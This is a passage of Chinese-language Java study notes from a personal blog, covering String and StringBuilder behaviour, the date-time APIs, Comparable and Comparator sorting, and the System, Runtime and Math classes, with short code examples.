s1.concat(s2);</span><br><span class="line"><span class="type">String</span> <span class="variable">s8</span> <span class="operator">=</span> s3.intern(); <span class="comment">// 堆空间的s3对象在调用intern()之后，会将常量池中已经存在的&quot;HelloWorld!&quot;字符串赋值给s8</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s9</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">s9 = s9 + <span class="string">&quot;World!&quot;</span>;</span><br><span class="line"><span class="comment">// 实际上原来的“Hello”字符串对象已经丢弃了，现在在堆空间中产生了一个字符串s9+&quot;World!&quot;（也就是&quot;HelloWorld!&quot;)。</span></span><br><span class="line"><span class="comment">// 如果多次执行这些改变串内容的操作，会导致大量副本字符串对象存留在内存中，降低效率。</span></span><br><span class="line"><span class="comment">// 如果这样的操作放到循环中，会极大影响程序的性能。</span></span><br><span class="line"></span><br><span class="line">System.out.println(s3 == s4); <span class="comment">//true</span></span><br><span class="line">System.out.println(s3 == s5); <span class="comment">//true</span></span><br><span class="line">System.out.println(s3 == s6); <span class="comment">//true</span></span><br><span class="line">System.out.println(s3 == s7); <span class="comment">//false</span></span><br><span class="line">System.out.println(s3 == s8); <span class="comment">//true</span></span><br><span class="line">System.out.println(s3 == s9); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>


<p><strong>String的构造器</strong></p>
<ul>
<li><code>public String() </code> ：初始化新创建的 String对象，以使其表示空字符序列。</li>
<li><code> String(String original)</code>： 初始化一个新创建的 <code>String</code> 对象，使其表示一个与参数相同的字符序列；换句话说，新创建的字符串是该参数字符串的副本。</li>
<li><code>public String(char[] value) </code> ：通过当前参数中的字符数组来构造新的String。</li>
<li><code>public String(char[] value,int offset, int count) </code> ：通过字符数组的一部分来构造新的String。</li>
<li><code>public String(byte[] bytes) </code> ：通过使用平台的<strong>默认字符集</strong>解码当前参数中的字节数组来构造新的String。</li>
<li><code>public String(byte[] bytes,String charsetName) </code> ：通过使用指定的字符集解码当前参数中的字节数组来构造新的String。</li>
</ul>
<h5 id="String与其他类型之间的转换"><a href="#String与其他类型之间的转换" class="headerlink" title="String与其他类型之间的转换"></a>String与其他类型之间的转换</h5><p>String与包装类的转换（详见包装类章节）</p>
<p>String与char[]之间的转换</p>
<ol>
<li>String –&gt; char[]: <code>arr = str.toCharArray();</code></li>
<li>char[] –&gt; String: <code>str = new String(arr);</code></li>
</ol>
<p>String与byte[]之间的转换</p>
<ol>
<li>String –&gt; byte[]: <code>arr = str.getBytes();</code> &#x2F;&#x2F; 使用默认字符集转换<br>String –&gt; byte[]: <code>arr = str.getBytes(&quot;gbk&quot;);</code> &#x2F;&#x2F; 使用gbk字符集<br>UTF-8中兼容了ASCII码，一个字母占一个字节，一个汉字占3字节<br>gbk中兼容了ASCII码，一个字母占一个字节，一个汉字占2字节</li>
<li>byte[] –&gt; String: <code>str = new String(arr);</code><br>               <code>str = new String(arr,&quot;gbk&quot;);</code></li>
<li>解码和编码时使用的字符集必须一致，否则会报错</li>
</ol>
<h5 id="String-中的常用方法"><a href="#String-中的常用方法" class="headerlink" title="String 中的常用方法"></a>String 中的常用方法</h5><p><strong>比较，转换，拼接，空格</strong></p>
<ol>
<li>boolean isEmpty()：字符串是否为空</li>
<li>int length()：返回字符串的长度</li>
<li>String concat(xx)：拼接</li>
<li>boolean equals(Object obj)：比较字符串是否相等，区分大小写</li>
<li>boolean equalsIgnoreCase(Object obj)：比较字符串是否相等，不区分大小写</li>
<li>int compareTo(String other)：比较字符串大小，区分大小写，<strong>按照Unicode编码值</strong>比较大小</li>
<li>int compareToIgnoreCase(String other)：比较字符串大小，不区分大小写</li>
<li>String toLowerCase()：将字符串中大写字母转为小写</li>
<li>String toUpperCase()：将字符串中小写字母转为大写</li>
<li>String trim()：去掉字符串前后空白符</li>
<li>public String intern()：结果在常量池中共享</li>
</ol>
<p><strong>查找</strong></p>
<ol>
<li>boolean contains(xx)：是否包含x</li>
<li>int indexOf(xx)：从前往后找当前字符串中xx，即如果有返回第一次出现的下标，要是没有返回-1</li>
<li>int indexOf(String str, int fromIndex)：返回指定子字符串在此字符串中第一次出现处的索引，从指定的索引开始</li>
<li>int lastIndexOf(xx)：从后往前找当前字符串中xx，即如果有返回最后一次出现的下标，要是没有返回-1</li>
<li>int lastIndexOf(String str, int fromIndex)：返回指定子字符串在此字符串中最后一次出现处的索引，从指定的索引开始反向搜索。</li>
</ol>
<p><strong>字符串截取</strong></p>
<ol>
<li>String substring(int beginIndex) ：返回一个新的字符串，它是此字符串的从beginIndex开始截取到最后的一个子字符</li>
<li>String substring(int beginIndex, int endIndex) ：返回一个新字符串，它是此字符串从beginIndex开始截取到endIndex(不包含)的一个子字符串。</li>
</ol>
<p><strong>字符&#x2F;字符数组相关</strong></p>
<ol>
<li>char charAt(index)：返回[index]位置的字符</li>
<li>char[] toCharArray()： 将此字符串转换为一个新的字符数组返回</li>
<li>static String valueOf(char[] data)  ：返回指定数组中表示该字符序列的 String</li>
<li>static String valueOf(char[] data, int offset, int count) ： 返回指定数组中表示该字符序列的 String</li>
<li>static String copyValueOf(char[] data)： 返回指定数组中表示该字符序列的 String</li>
<li>static String copyValueOf(char[] data, int offset, int count)：返回指定数组中表示该字符序列的 String</li>
</ol>
<p><strong>开头与结尾</strong></p>
<ol>
<li>boolean startsWith(xx)：测试此字符串是否以指定的前缀开始 </li>
<li>boolean startsWith(String prefix, int toffset)：测试此字符串从指定索引开始的子字符串是否以指定前缀开始</li>
<li>boolean endsWith(xx)：测试此字符串是否以指定的后缀结束</li>
</ol>
<p><strong>替换</strong></p>
<ol>
<li>String replace(char oldChar, char newChar)：返回一个新的字符串，它是通过用 newChar 替换此字符串中出现的所有 oldChar 得到的。 不支持正则。</li>
<li>String replace(CharSequence target, CharSequence replacement)：使用指定的字面值替换序列替换此字符串所有匹配字面值目标序列的子字符串。 </li>
<li>String replaceAll(String regex, String replacement)：使用给定的 replacement 替换此字符串所有匹配给定的正则表达式的子字符串。 </li>
<li>String replaceFirst(String regex, String replacement)：使用给定的 replacement 替换此字符串匹配给定的正则表达式的第一个子字符串。</li>
</ol>
<h5 id="StringBuffer-StringBuilder"><a href="#StringBuffer-StringBuilder" class="headerlink" title="StringBuffer StringBuilder"></a>StringBuffer StringBuilder</h5><p>三者比较</p>
<ol>
<li>String: 不可变的字符序列; </li>
<li>StringBuffer: 可变字符序列; 线程安全; 效率低; </li>
<li>StringBuilder: 可变字符序列; 线程不安全; 效率高; </li>
<li>jdk&lt;8, 底层均使用char[]; jdk&gt;&#x3D;8 底层均使用byte[]</li>
<li>效率比较(尤其增删改)：StringBuilder &gt; StringBuffer &gt; String</li>
</ol>
<p>StringBuilder(jdk&lt;8)内部属性和方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>[] value; <span class="comment">//存储字符序列 没有final修饰！</span></span><br><span class="line"><span class="type">int</span> count; <span class="comment">//实际存储的字符个数</span></span><br></pre></td></tr></table></figure>

<p>StringBuilder使用<strong>可变性分析</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(); <span class="comment">// 底层实现char[] value = new char[16];</span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(); <span class="comment">// 底层实现char[] value = new char[16 + &quot;abc&quot;.length];</span></span><br></pre></td></tr></table></figure>
<p>使用.append()方法添加字符串时，当添加超过16个字符时(count&gt;value.length)，需要扩容，重新创建一个数组，默认容量为原有容量的2倍+2，并将原value数组中的元素复制到新的数组中</p>
<p><strong>开发使用建议</strong></p>
<ol>
<li>如果开发中需要频繁针对字符串进行<strong>增删改</strong>操作，建议使用<strong>StringBuilder和StringBuffer</strong>取代String，避免频繁创建新对象降低效率</li>
<li>如果开发中<strong>不涉及线程安全</strong>问题，建议使用<strong>StringBuilder</strong>替换StringBuffer，效率更高</li>
<li>如果开发中大体<strong>确认要操作的字符的个数</strong>，建议<strong>使用带int capacity参数的构造器</strong>，可以避免底层多层扩容操作降低效率</li>
</ol>
<p><strong>常用方法</strong><br>增、删、改、查、插入、长度、反转<br>（1）StringBuffer append(xx)：提供了很多的append()方法，用于进行字符串追加的方式拼接<br>（2）StringBuffer delete(int start, int end)：删除[start,end)之间字符<br>（3）StringBuffer deleteCharAt(int index)：删除[index]位置字符<br>（4）StringBuffer replace(int start, int end, String str)：替换[start,end)范围的字符序列为str<br>（5）void setCharAt(int index, char c)：替换[index]位置字符<br>（6）char charAt(int index)：查找指定index位置上的字符<br>（7）StringBuffer insert(int index, xx)：在[index]位置插入xx<br>（8）int length()：返回存储的字符数据的长度<br>（9）StringBuffer reverse()：反转<br>查、截取<br>（1）int indexOf(String str)：在当前字符序列中查询str的第一次出现下标<br>（2）int indexOf(String str, int fromIndex)：在当前字符序列[fromIndex,最后]中查询str的第一次出现下标<br>（3）int lastIndexOf(String str)：在当前字符序列中查询str的最后一次出现下标<br>（4）int lastIndexOf(String str, int fromIndex)：在当前字符序列[fromIndex,最后]中查询str的最后一次出现下标<br>（5）String substring(int start)：截取当前字符序列[start,最后]<br>（6）String substring(int start, int end)：截取当前字符序列[start,end]<br>（7）String toString()：返回此序列中数据的字符串表示形式<br>（8）void setLength(int newLength) ：设置当前字符序列长度为newLength，多出部分忽略，少的以’\0’填充，</p>
<p>多看题！！<br>new会分配新地址，String改会new!</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">sb.append(str);<span class="comment">// 源码上处理机制就是如果是null之间按字符串处理</span></span><br><span class="line">System.out,println(sb.length());<span class="comment">//4</span></span><br><span class="line">System.out,println(sb)<span class="comment">//&quot;null&quot; </span></span><br><span class="line"><span class="type">StringBuffer</span> <span class="variable">sb1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(sb);<span class="comment">//报错</span></span><br><span class="line">System.out,println(sb1);<span class="comment">//空指针异常</span></span><br></pre></td></tr></table></figure>

<h4 id="日期时间类"><a href="#日期时间类" class="headerlink" title="日期时间类"></a>日期时间类</h4><h5 id="jdk"><a href="#jdk" class="headerlink" title="jdk&lt;8 API"></a>jdk&lt;8 API</h5><p>System类提供的<code>public static long currentTimeMillis()</code>：</p>
<ul>
<li>用来返回当前时间与1970年1月1日0时0分0秒之间以毫秒为单位的时间差。</li>
<li>此方法适于计算时间差。</li>
</ul>
<p><strong>util.Date</strong><br>同样相对于1970年1月1日0时0分0秒</p>
<ul>
<li>构造器：</li>
</ul>
<ul>
<li>Date()：使用无参构造器创建的对象可以获取本地当前时间。</li>
<li>Date(long 毫秒数)：把该毫秒值换算成日期时间对象</li>
</ul>
<ul>
<li>常用方法</li>
</ul>
<ul>
<li>getTime(): 返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。</li>
<li>toString(): 把此 Date 对象转换为以下形式的 String： dow mon dd hh:mm:ss zzz yyyy 其中： dow 是一周中的某一天 (Sun, Mon, Tue, Wed, Thu, Fri, Sat)，zzz是时间标准。</li>
<li>其它很多方法都过时了。</li>
</ul>
<p><strong>sql.Date</strong></p>
<ul>
<li>对应数据库中的date类型数据</li>
<li><code>java.sql.Date date1 = new java.sql.Date(1370020020220L);</code></li>
<li>util.Date-&gt;sql.Date:<br>Date date1 &#x3D; new Date();<br>java.sql.Date date &#x3D; new java.sql.Date(date1.getTime());</li>
</ul>
<p><strong>text.SimpleDateFormat</strong><br>用于日期时间的格式化(日期-&gt;字符串)和解析(字符串-&gt;日期)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>();<span class="comment">// 默认格式2024/7/12 下午6:48</span></span><br><span class="line"><span class="comment">// 也可使用以下构造器格式化，日期将按指定的格式显示，字母含义可见其具体说明文档（点击可见）</span></span><br><span class="line"><span class="comment">// SimpleDateFormat sdf = new SimpleDateFormat(&quot;EEE, d MMM yyyy HH:mm:ss Z&quot;);</span></span><br><span class="line"><span class="comment">// 周五, 12 7月 2024 18:52:40 +0800</span></span><br><span class="line"><span class="comment">// 常用SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;)</span></span><br><span class="line"><span class="type">Date</span> <span class="variable">date1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">strDate</span> <span class="operator">=</span> sdf.format(date1);</span><br><span class="line"><span class="type">Date</span> <span class="variable">date2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    date2 = sdf.parse(<span class="string">&quot;22/12/4 下午3:22&quot;</span>);</span><br><span class="line">    <span class="comment">// 默认必须按此格式，必须使用try-catch包围</span></span><br><span class="line">    <span class="comment">// 如上文采用第二种方式，则应按指定格式输入</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(strDate);</span><br><span class="line">System.out.println(date2);</span><br></pre></td></tr></table></figure>


<p><strong>util.Calendar</strong><br>jdk8后大部分Date的方法都被calendar中方法替代<br>使用步骤：</p>
<ol>
<li>实例化：由于Calendar是抽象类，需要创建其子类实例，通过Calendar.getInstance()获取</li>
<li>一个Calendar的实例是系统时间的抽象表示，可以修改或获取 YEAR、MONTH、DAY_OF_WEEK、HOUR_OF_DAY 、MINUTE、SECOND等 <code>日历字段</code>对应的时间值。</li>
</ol>
<ul>
<li>public int get(int field)：返回给定日历字段的值</li>
<li>public void set(int field,int value) ：将给定的日历字段设置为指定的值</li>
<li>public void add(int field,int amount)：根据日历的规则，为给定的日历字段添加或者减去指定的时间量</li>
<li>public final Date getTime()：将Calendar转成Date对象</li>
<li>public final void setTime(Date date)：使用指定的Date对象重置Calendar的时间</li>
</ul>
<h4 id="jdk-8-API"><a href="#jdk-8-API" class="headerlink" title="jdk&gt;8 API"></a>jdk&gt;8 API</h4><p>以往时间API的缺点：</p>
<ol>
<li>可变性：日期时间应当是不可变的，修改应当生成新对象</li>
<li>偏移性：年是从1970年开始，月份是从0开始，表示2022需要设置2022-1970&#x3D;52</li>
<li>格式化：格式化只对Date有用，Calendar不行</li>
<li>线程不安全，不能处理闰秒</li>
</ol>
<p>新的日期时间API包括：</p>
<ul>
<li><code>java.time</code> – 包含值对象的基础包</li>
<li><code>java.time.chrono</code> – 提供对不同的日历系统的访问。</li>
<li><code>java.time.format</code> – 格式化和解析时间和日期</li>
<li><code>java.time.temporal</code> – 包括底层框架和扩展特性</li>
<li><code>java.time.zone</code> – 包含时区支持的类</li>
</ul>
<p>新的 java.time 中包含了所有关于时钟（Clock），本地日期（LocalDate）、本地时间（LocalTime）、本地日期时间（LocalDateTime）、时区（ZonedDateTime）和持续时间（Duration）的类。</p>
<p><strong>本地日期时间：LocalDate、LocalTime、LocalDateTime</strong><br>类似Calendar</p>
<table>
<thead>
<tr>
<th>方法</th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>now() </code>&#x2F; now(ZoneId zone)</td>
<td>静态方法，根据当前时间创建对象&#x2F;指定时区的对象</td>
</tr>
<tr>
<td><code>of(xx,xx,xx,xx,xx,xxx)</code></td>
<td>静态方法，根据指定日期&#x2F;时间创建对象，无需相对1970偏移，输入什么时间就是什么时间</td>
</tr>
<tr>
<td>getDayOfMonth()&#x2F;getDayOfYear()</td>
<td>获得月份天数(1-31) &#x2F;获得年份天数(1-366)</td>
</tr>
<tr>
<td>getDayOfWeek()</td>
<td>获得星期几(返回一个 DayOfWeek 枚举值)</td>
</tr>
<tr>
<td>getMonth()</td>
<td>获得月份, 返回一个 Month 枚举值</td>
</tr>
<tr>
<td>getMonthValue() &#x2F; getYear()</td>
<td>获得月份(1-12) &#x2F;获得年份</td>
</tr>
<tr>
<td>getHours()&#x2F;getMinute()&#x2F;getSecond()</td>
<td>获得当前对象对应的小时、分钟、秒</td>
</tr>
<tr>
<td>withDayOfMonth()&#x2F;withDayOfYear()&#x2F;withMonth()&#x2F;withYear()</td>
<td>将月份天数、年份天数、月份、年份修改为指定的值并返回新的对象</td>
</tr>
<tr>
<td>with(TemporalAdjuster  t)</td>
<td>将当前日期时间设置为校对器指定的日期时间</td>
</tr>
<tr>
<td>plusDays(), plusWeeks(), plusMonths(), plusYears(),plusHours()</td>
<td>向当前对象添加几天、几周、几个月、几年、几小时</td>
</tr>
<tr>
<td>minusMonths() &#x2F; minusWeeks()&#x2F;minusDays()&#x2F;minusYears()&#x2F;minusHours()</td>
<td>从当前对象减去几月、几周、几天、几年、几小时</td>
</tr>
<tr>
<td>plus(TemporalAmount t)&#x2F;minus(TemporalAmount t)</td>
<td>添加或减少一个 Duration 或 Period</td>
</tr>
<tr>
<td>isBefore()&#x2F;isAfter()</td>
<td>比较两个 LocalDate</td>
</tr>
<tr>
<td>isLeapYear()</td>
<td>判断是否是闰年（在LocalDate类中声明）</td>
</tr>
<tr>
<td>format(DateTimeFormatter  t)</td>
<td>格式化本地日期、时间，返回一个字符串</td>
</tr>
<tr>
<td>parse(Charsequence text)</td>
<td>将指定格式的字符串解析为日期、时间</td>
</tr>
</tbody></table>
<p><strong>Instant</strong>类似Date<br>Instant：时间线上的一个瞬时点。 这可能被用来记录应用程序中的事件时间戳。时间戳是指格林威治时间1970年01月01日00时00分00秒(北京时间1970年01月01日08时00分00秒)起至现在的总秒数。</p>
<ul>
<li><code>java.time.Instant</code>表示时间线上的一点，而不需要任何上下文信息，例如，时区。概念上讲，<code>它只是简单的表示自1970年1月1日0时0分0秒（UTC）开始的秒数。</code></li>
</ul>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>now()</code></td>
<td>静态方法，返回默认UTC时区的Instant类的对象</td>
</tr>
<tr>
<td><code>ofEpochMilli(long epochMilli)</code></td>
<td>静态方法，返回在1970-01-01 00:00:00基础上加上指定毫秒数之后的Instant类的对象</td>
</tr>
<tr>
<td>atOffset(ZoneOffset offset)</td>
<td>结合即时的偏移来创建一个 OffsetDateTime</td>
</tr>
<tr>
<td><code>toEpochMilli()</code></td>
<td>返回1970-01-01 00:00:00到当前时间的毫秒数，即为时间戳</td>
</tr>
</tbody></table>
<p><strong>DateTimeFormatter</strong></p>
<p>该类提供了三种格式化方法：</p>
<ul>
<li>(了解)预定义的标准格式。如：ISO_LOCAL_DATE_TIME、ISO_LOCAL_DATE、ISO_LOCAL_TIME</li>
<li>(了解)本地化相关的格式。如：ofLocalizedDate(FormatStyle.LONG)</li>
<li>自定义的格式。如：ofPattern(“yyyy-MM-dd hh:mm:ss”)</li>
</ul>
<table>
<thead>
<tr>
<th><strong>方</strong>   <strong>法</strong></th>
<th><strong>描</strong>   <strong>述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>ofPattern(String</strong>  <strong>pattern)</strong></td>
<td>静态方法，返回一个指定字符串格式的DateTimeFormatter</td>
</tr>
<tr>
<td><strong>format(TemporalAccessor</strong> <strong>t)</strong></td>
<td>格式化一个日期、时间，返回字符串</td>
</tr>
<tr>
<td><strong>parse(CharSequence</strong>  <strong>text)</strong></td>
<td>将指定格式的字符序列解析为一个日期、时间</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//方式三：自定义的方式（关注、重点）</span></span><br><span class="line"><span class="type">DateTimeFormatter</span> <span class="variable">dateTimeFormatter</span> <span class="operator">=</span> DateTimeFormatter.ofPattern(<span class="string">&quot;yyyy/MM/dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="comment">//格式化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">strDateTime</span> <span class="operator">=</span> dateTimeFormatter.format(LocalDateTime.now());</span><br><span class="line">System.out.println(strDateTime); <span class="comment">//2022/12/04 21:05:42</span></span><br><span class="line"><span class="comment">//解析</span></span><br><span class="line"><span class="type">TemporalAccessor</span> <span class="variable">accessor</span> <span class="operator">=</span> dateTimeFormatter.parse(<span class="string">&quot;2022/12/04 21:05:42&quot;</span>);</span><br><span class="line"><span class="type">LocalDateTime</span> <span class="variable">localDateTime</span> <span class="operator">=</span> LocalDateTime.from(accessor);</span><br><span class="line">System.out.println(localDateTime); <span class="comment">//2022-12-04T21:05:42</span></span><br></pre></td></tr></table></figure>

<h4 id="比较器"><a href="#比较器" class="headerlink" title="比较器"></a>比较器</h4><h5 id="Comparable-自然排序"><a href="#Comparable-自然排序" class="headerlink" title="Comparable 自然排序"></a>Comparable 自然排序</h5><p>实现Comparable接口中的compareTo方法：<br>实现步骤：</p>
<ol>
<li>具体的类A实现Comparable接口</li>
<li>重写Comparable接口中的compareTo()方法，此方法指明比较类A的对象的大小的标准(可以用.compare()方法)</li>
<li>创建类A的多个实例，进行比较或排序</li>
<li>(此后使用sort()方法排序时默认即会按上述标准，也可调用compareTo比较二者)</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//按照价格，比较商品的大小</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Goods) &#123;</span><br><span class="line">            <span class="type">Goods</span> <span class="variable">other</span> <span class="operator">=</span> (Goods) o;</span><br><span class="line">            <span class="keyword">return</span> Double.compare(<span class="built_in">this</span>.price,other.price);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;输入的数据类型不一致&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造器、getter、setter、toString()方法略</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComparableTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Goods[] all = <span class="keyword">new</span> <span class="title class_">Goods</span>[<span class="number">4</span>];</span><br><span class="line">        all[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;War and Peace&quot;</span>, <span class="number">100</span>);</span><br><span class="line">        all[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;Childhood&quot;</span>, <span class="number">80</span>);</span><br><span class="line">        all[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;Scarlet and Black&quot;</span>, <span class="number">140</span>);</span><br><span class="line">        all[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;Notre Dame de Paris&quot;</span>, <span class="number">120</span>);</span><br><span class="line"></span><br><span class="line">        Arrays.sort(all);</span><br><span class="line"></span><br><span class="line">        System.out.println(Arrays.toString(all));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Comparator-定制排序"><a href="#Comparator-定制排序" class="headerlink" title="Comparator 定制排序"></a>Comparator 定制排序</h5><p>当元素的类型没有实现java.lang.Comparable接口而又不方便修改代码（例如：一些第三方的类，你只有.class文件，没有源文件）<br>如果一个类，实现了Comparable接口，也指定了两个对象的比较大小的规则，但是此时此刻我不想按照它预定义的方法比较大小，但是我又不能随意修改，因为会影响其他地方的使用，怎么办？</p>
<p>java.util.Comparator接口，强行对多个对象进行整体排序的比较。</p>
<ul>
<li>重写compare(Object o1,Object o2)方法，比较o1和o2的大小：如果方法返回正整数，则表示o1大于o2；如果返回0，表示相等；返回负整数，表示o1小于o2。</li>
<li>可以将 Comparator 传递给 sort 方法（如 Collections.sort 或 Arrays.sort），从而允许在排序顺序上实现精确控制。</li>
</ul>
<p>实现步骤：</p>
<ol>
<li>创建一个实现Comparator接口的实现类A</li>
<li>实现类A要求重写重写Comparator接口中的compare()方法，此方法指明要比较的对象的大小的标准</li>
<li>创建此实现类A的对象，并将此对象传入到相关方法的参数位置即可（如Array.sort(..,类A的实例)）</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Goods[] all = <span class="keyword">new</span> <span class="title class_">Goods</span>[<span class="number">4</span>];</span><br><span class="line">all[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;War and Peace&quot;</span>, <span class="number">100</span>);</span><br><span class="line">all[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;Childhood&quot;</span>, <span class="number">80</span>);</span><br><span class="line">all[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;Scarlet and Black&quot;</span>, <span class="number">140</span>);</span><br><span class="line">all[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">Goods</span>(<span class="string">&quot;Notre Dame de Paris&quot;</span>, <span class="number">120</span>);</span><br><span class="line"></span><br><span class="line">Arrays.sort(all, <span class="keyword">new</span> <span class="title class_">Comparator</span>() &#123;<span class="comment">//匿名实现类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">        <span class="type">Goods</span> <span class="variable">g1</span> <span class="operator">=</span> (Goods) o1;</span><br><span class="line">        <span class="type">Goods</span> <span class="variable">g2</span> <span class="operator">=</span> (Goods) o2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> g1.getName().compareTo(g2.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">System.out.println(Arrays.toString(all));</span><br></pre></td></tr></table></figure>

<h4 id="其他常见类"><a href="#其他常见类" class="headerlink" title="其他常见类"></a>其他常见类</h4><h5 id="System"><a href="#System" class="headerlink" title="System"></a>System</h5><p>System类代表系统，系统级的很多属性和控制方法都放置在该类的内部。该类位于<code>java.lang包</code>。<br>由于该类的构造器是private的，所以无法创建该类的对象。其内部的成员变量和成员方法都是<code>static的</code>，所以也可以很方便的进行调用。</p>
<p>成员变量<br>System类内部包含<code>in</code>、<code>out</code>和<code>err</code>三个成员变量，分别代表标准输入流(键盘输入)，标准输出流(显示器)和标准错误输出流(显示器)。</p>
<p>成员方法</p>
<ul>
<li><code>native long currentTimeMillis()</code>：<br>该方法的作用是返回当前的计算机时间，时间的表达格式为当前计算机时间和GMT时间(格林威治时间)1970年1月1号0时0分0秒所差的毫秒数。</li>
<li><code>void exit(int status)</code>：<br>该方法的作用是退出程序。其中status的值为0代表正常退出，非零代表异常退出。使用该方法可以在图形界面编程中实现程序的退出功能等。</li>
<li><code>void gc()</code>：<br>该方法的作用是请求系统进行垃圾回收。至于系统是否立刻回收，则取决于系统中垃圾回收算法的实现以及系统执行时的情况。</li>
<li><code>String getProperty(String key)</code>：<br>该方法的作用是获得系统中属性名为key的属性对应的值。系统中常见的属性名以及属性的作用如下表所示：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240712210402.png" alt="系统属性值表"></li>
<li><code>static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length)</code>：<br>从指定源数组中复制一个数组，复制从指定的位置开始，到目标数组的指定位置结束。常用于数组的插入和删除</li>
</ul>
<h5 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h5><p>每个 Java 应用程序都有一个 <code>Runtime</code> 类实例，使应用程序能够与其运行的环境相连接。</p>
<p><code>public static Runtime getRuntime()</code>： 返回与当前 Java 应用程序相关的运行时对象。应用程序不能创建自己的 Runtime 类实例。<br><code>public long totalMemory()</code>：返回 Java 虚拟机中初始化时的内存总量。此方法返回的值可能随时间的推移而变化，这取决于主机环境。默认为物理电脑内存的1&#x2F;64。<br><code>public long maxMemory()</code>：返回 Java 虚拟机中最大程度能使用的内存总量。默认为物理电脑内存的1&#x2F;4。<br><code>public long freeMemory()</code>：回 Java 虚拟机中的空闲内存量。调用 gc 方法可能导致 freeMemory 返回值的增加。</p>
<h5 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h5><p><code>java.lang.Math</code> 类包含用于执行基本数学运算的方法，如初等指数、对数、平方根和三角函数。类似这样的工具类，其所有方法均为静态方法，并且不会创建对象，调用起来非常简单。</p>
